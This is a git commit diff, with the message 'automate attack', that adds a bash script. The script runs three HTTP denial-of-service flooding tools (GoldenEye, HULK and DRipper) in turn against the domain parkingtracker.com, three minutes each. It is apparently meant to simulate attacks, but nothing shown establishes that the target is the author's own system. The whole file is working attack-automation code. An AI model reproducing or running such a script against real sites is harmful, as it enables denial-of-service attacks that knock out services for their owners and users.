78efc2d4148d75f40f0222c9303e4d80b45f05a9
Sheh Vincent <sheh.v123@gmail.com>
2024-03-16 11:44:57 +0800

    automate attack

---
+++ attack/python_attack/simulateAttack.sh
@@ -0,0 +1,25 @@
+#!/bin/bash
+
+# Define the commands in an array
+commands=(
+  "./python_attack/python3 goldeneye.py http://parkingtracker.com"
+  "./python_attack/python3 hulk.py"
+  "./python_attack/python3 DRipper.py -s parkingtracker.com"
+)
+
+# Loop through each command
+for cmd in "${commands[@]}"; do
+  echo "Running command: $cmd"
+  # Start the command in the background
+  $cmd &
+  # Get the PID of the command just run
+  cmd_pid=$!
+  # Wait for 180 seconds before killing the command
+  sleep 180
+  # Kill the command
+  kill $cmd_pid
+  # Optional: sleep for a bit before starting the next command
+  sleep 2
+done
+
+echo "All commands have been executed."
